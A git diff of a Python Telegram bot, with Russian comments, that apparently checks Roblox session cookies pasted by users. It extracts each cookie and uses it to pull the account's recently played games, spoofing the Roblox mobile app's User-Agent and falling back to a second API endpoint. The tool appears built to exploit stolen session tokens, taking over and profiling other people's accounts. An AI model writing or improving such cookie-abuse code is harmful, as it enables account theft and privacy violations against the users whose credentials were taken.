@@ -45,35 +45,44 @@ def get_extra_info(u_id):
 
 def get_recent_places(cookies):
     try:
-        # Используем самый точный API истории посещений
+        # Мобильный API, который Roblox использует для вкладки Home
         url = "https://games.roblox.com/v2/users/sub-home/content"
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Accept": "application/json"
-        }
-        res = requests.get(url, cookies=cookies, headers=headers, timeout=7).json()
         
-        # Парсим названия игр из новой структуры ответа
-        games = []
-        if 'contentItems' in res:
-            for item in res['contentItems']:
-                if 'gameName' in item:
-                    games.append(item['gameName'])
-                elif 'name' in item:
-                    games.append(item['name'])
+        # Имитируем мобильное приложение (очень важно!)
+        headers = {
+            "User-Agent": "RobloxApp/5.0 (iPhone; iOS 15.0; Scale/2.0)",
+            "Accept": "application/json",
+            "Roblox-Place-Id": "0" 
+        }
+        
+        res = requests.get(url, cookies=cookies, headers=headers, timeout=7)
+        
+        if res.status_code == 200:
+            data = res.json()
+            games = []
+            # Ищем игры в мобильной структуре ответа
+            if 'contentItems' in data:
+                for item in data['contentItems']:
+                    # Проверяем разные поля, где может лежать название
+                    name = item.get('gameName') or item.get('name') or item.get('title')
+                    if name:
+                        games.append(name)
+            
+            if games:
+                # Убираем дубликаты и берем первые 10
+                unique_games = list(dict.fromkeys(games))
+                return "\n • " + "\n • ".join(unique_games[:10])
 
-        # Если первый способ не выдал результат, пробуем второй (через ID пользователя мы его достанем в check_cookie)
-        return "\n • " + "\n • ".join(games[:10]) if games else "Нет недавних заходов"
-    except:
-        return "Ошибка доступа к истории"
-
-def get_game_badges(u_id, universe_id, cookies):
-    try:
-        url = f"https://badges.roblox.com/v1/users/{u_id}/universes/{universe_id}/badges?limit=3"
-        res = requests.get(url, cookies=cookies, timeout=3).json()
-        badges = [b['name'] for b in res.get('data', [])]
-        return " (🏆: " + ", ".join(badges) + ")" if badges else ""
-    except: return ""
+        # Если мобильный API не сработал, пробуем запасной эндпоинт для истории
+        alt_url = "https://games.roblox.com/v1/games/list?model.pageContext.sortName=LastPlayed"
+        alt_res = requests.get(alt_url, cookies=cookies, headers=headers, timeout=5).json()
+        alt_games = [g['name'] for g in alt_res.get('games', [])]
+        
+        return "\n • " + "\n • ".join(alt_games[:10]) if alt_games else "Нет истории заходов"
+        
+    except Exception as e:
+        print(f"Ошибка истории: {e}")
+        return "Скрыто настройками"
 
 def check_cookie(raw_text):
     cookie = extract_cookie(raw_text)
@@ -155,5 +164,6 @@ def handle(message):
 if __name__ == '__main__':
     keep_alive()
     bot.infinity_polling()
+
 
 
